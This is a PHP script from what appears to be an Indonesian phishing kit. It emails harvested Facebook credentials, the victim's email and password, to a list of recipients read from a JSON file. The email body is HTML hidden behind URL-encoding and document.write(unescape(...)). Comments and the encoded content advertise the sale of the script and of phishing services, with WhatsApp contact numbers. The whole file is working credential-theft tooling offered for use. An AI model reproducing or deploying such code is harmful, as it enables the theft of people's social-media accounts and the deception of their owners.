<?php
//mencegah masuk tanpa method get
if($email == "" && $total == ""){
$url = $_SERVER['PHP_SELF'];
header("Location: send.php");
}

//method get
$total = '1';

//mengambil random isian
include 'setting/korban.php';
$noperess = '08'.rand(1000000,9999999999);

$log=array("Facebook", "VK");
$random_log=array_rand($log,2);

//info sendmail
$emailku = $email;
$logress = $log[$random_log[0]];
$idress = rand(100000000,9999999999);
$subjek = "🇮🇩 | Results Punya Si $mailress";
$pesan = <<<EOD
<script>

// BUY SCRIPT NO ENC CHAT 
// WHATSAPP : 083153025334

document.write(unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%3Ctitle%3E%3C/title%3E%0A%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%2C%20minimum-scale%3D1.0%2C%20maximum-scale%3D1.0%2C%20user-scalable%3Dno%22/%3E%0A%3Cstyle%20type%3D%22text/css%22%3E%0Abody%20%7B%0A%09font-family%3A%20%22Helvetica%22%3B%0A%09width%3A%2090%25%3B%0A%09display%3A%20block%3B%0A%09margin%3A%20auto%3B%0A%09border%3A%201px%20solid%20%23fff%3B%0A%09background%3A%20%23fff%3B%0A%7D%0A%0A.result%20%7B%0A%09width%3A%20100%25%3B%0A%09height%3A%20100%25%3B%0A%09display%3A%20block%3B%0A%09margin%3A%20auto%3B%0A%09position%3A%20fixed%3B%0A%09top%3A%200%3B%0A%09right%3A%200%3B%0A%09left%3A%200%3B%0A%09bottom%3A%200%3B%0A%09z-index%3A%20999%3B%0A%09overflow-y%3A%20scroll%3B%0A%7D%0A%0A.tblResult%20%7B%0A%09width%3A%20100%25%3B%0A%09display%3A%20table%3B%0A%09margin%3A%200px%20auto%3B%0A%09border-collapse%3A%20collapse%3B%0A%09text-align%3A%20center%3B%0A%09background%3A%20%23FFF%3B%0A%7D%0A%0A.tblResult%20th%20%7B%0A%09text-align%3A%20left%3B%0A%09font-size%3A%200.75em%3B%0A%09margin%3A%20auto%3B%0A%09padding%3A%2015px%2010px%3B%0A%09background%3A%20%23OFF99%3B%0A%09border%3A%202px%20solid%20%23OFF99%3B%0A%09color%3A%20%23000%3B%0A%7D%0A%0A.tblResult%20td%20%7B%0A%09font-size%3A%200.75em%3B%0A%09margin%3A%20auto%3B%0A%09padding%3A%2010px%3B%0A%09border%3A%202px%20solid%20%23OFF99%3B%0A%09text-align%3A%20left%3B%0A%09font-weight%3A%20bold%3B%0A%09color%3A%20%230B0B0B%3B%0A%09text-shadow%3A%200px%200px%2010px%20%23fff%3B%0A%7D%0A%0A.tblResult%20th%20img%20%7B%0A%09width%3A%2045px%3B%0A%09display%3A%20block%3B%0A%09margin%3A%20auto%3B%0A%09border-radius%3A%2050%25%3B%0A%09box-shadow%3A%200px%200px%2010px%20rgba%280%2C0%2C0%2C%200.5%29%3B%0A%7D%0A%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Cdiv%20class%3D%22result%22%3E%0A%3Ctable%20class%3D%22tblResult%22%3E%0A%3Ctr%3E%0A%3C/div%3E%0A%20%3Ctable%20border%3D%221%22%20bordercolor%3D%22%2319233f%22%20style%3D%22color%3A%23fff%3Bborder-radius%3A8px%3B%20border%3A3px%20solid%20white%3B%20border-collapse%3Acollapse%3Bwidth%3A100%25%3Bbackground%3A%23996633%3B%22%3E%0A%20%20%20%20%3Ctr%3E%0A%09%20%3Cdiv%20style%3D%22background%3A%20%23ff00fb%3B%20width%3A%20294%3B%20color%3A%20%23fff%3B%20text-align%3A%20center%3B%20padding%3A%2010px%3B%22%3E%uD83D%uDE80Created%20By%20FHS%uD83D%uDE80%3C/div%3E%0A%3Cth%20style%3D%22text-align%3A%20center%3B%22%20colspan%3D%223%22%3E%20Informasi%20Facebook%20%3C/th%3E%0A%09%09%09%09%3C/tr%3E%0A%09%09%09%09%3Ctr%3E%0A%09%09%09%09%09%3Ctd%20style%3D%22border-right%3A%20none%3B%22%3EEmail%3C/td%3E%0A%09%09%09%09%09%3Ctd%20style%3D%22text-align%3A%20center%3B%22%3E%24mailress%3C/td%3E%0A%09%09%09%09%3C/tr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%0A%09%09%09%09%09%3Ctd%20style%3D%22border-right%3A%20none%3B%22%3EPassword%3C/td%3E%0A%09%09%09%09%09%3Ctd%20style%3D%22text-align%3A%20center%3B%22%3E%24passress%3C/td%3E%0A%09%09%09%09%3C/tr%3E%0A%09%09%09%09%0A%09%09%09%09%3Ctr%3E%0A%09%09%09%09%09%3Cth%20style%3D%22text-align%3A%20center%3B%22%20colspan%3D%223%22%3E%26copy%3B%20FHS%20STORE%3C/th%3E%0A%09%09%09%09%3C/tr%3E%0A%09%09%09%3C/table%3E%0A%09%09%3Cdiv%20style%3D%22background%3A%20%23000%3B%20width%3A%20294%3B%20color%3A%20%23fff%3B%20text-align%3A%20center%3B%20padding%3A%2010px%3B%22%3E%3Cb%3EOrder%20Jasteb%3F%3Cbr%3EWhatsapp%20%3Ca%20href%3D%22https%3A//wa.me/6283861343113%22%3E%3Cb%3EKlik%20Disini%3C/b%3E%3C/a%3E%0A%09%09%09%09%09%09%09%09%3Cbr%3E%20Ladang%20Hosting%20%3Ca%20href%3D%22--eror%22%3E%3Cb%3EKlik%20Disini%3C/b%3E%3C/a%3E%20%3C/div%3E%20%0A%09%09%3C/div%3E%0A%09%3C/body%3E"));
//-->
</script>
EOD;				
include 'setting/ser.php';
$sender = 'From: '.$nik.'<'.$sender.'>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";

$read = file_get_contents('setting/data.json');
$json = json_decode($read, true);

foreach ($json as $key => $emailData) {
    $result = mail($emailData['email'], $subjek, $pesan, $headers);

    if ($result) {
        $json[$key]['jumlahResult'] -= 1;
        
        if ($json[$key]['jumlahResult'] <= 0) {
            unset($json[$key]);
        }
    }
}

file_put_contents('setting/data.json', json_encode(array_values($json)));
?>
